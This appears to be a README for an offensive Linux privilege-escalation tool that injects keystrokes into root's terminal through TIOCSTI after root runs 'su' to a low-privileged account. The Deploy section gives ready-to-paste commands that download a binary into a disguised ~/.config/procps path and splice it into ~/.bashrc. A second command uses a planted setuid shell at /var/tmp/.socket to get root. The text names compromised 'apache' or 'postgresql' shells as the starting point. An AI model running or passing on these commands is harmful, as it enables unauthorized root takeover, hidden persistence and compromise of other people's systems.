# Alice gets ROOT when ROOT does 'su alice'.  
(The oldest trick in the book - TTY / TIOCSTI stuffing)

Useful when all other exploits fail.

Typically used when the attacker has a shell as user 'apache', 'php' or 'postgresql'. Alice is used as an example only.

## Deploy
Cut & paste the following into Alice's shell:
```shell
mkdir -p ~/.config/procps 2>/dev/null
curl -o ~/.config/procps/reset -fsSL "https://github.com/hackerschoice/ttyinject/releases/download/v1.1/ttyinject-linux-$(uname -m)" \
&& chmod 755 ~/.config/procps/reset \
&& if grep -qFm1 'procps/reset' ~/.bashrc; then echo >&2 "Already installed in ~/.bashrc"; else \
echo "$(head -n1 ~/.bashrc)"$'\n'"~/.config/procps/reset 2>/dev/null"$'\n'"$(tail -n +2 ~/.bashrc)" >~/.bashrc; fi
```

Wait for ROOT to execute 'su alice' and thereafter gain root with:
```
/var/tmp/.socket -p -c "exec python3 -c \"import os;os.setuid(0);os.setgid(0);os.execl('/bin/bash', '-bash')\""
```
---

## Why this works:  
TL;DR:
* `su` does not allocate a new TTY when switching to a non-privileged user. 
* The non-privileged user can then use ioctl(0, TIOCSTI, ...) to inject input into the root's shell prompt.
* The injected input copies `/bin/sh` to `/var/tmp/.socket` and +s the same.
* Executes only once (from Alice's `~/.bashrc`). Deletes itself afterwards.

Read the source for more details.
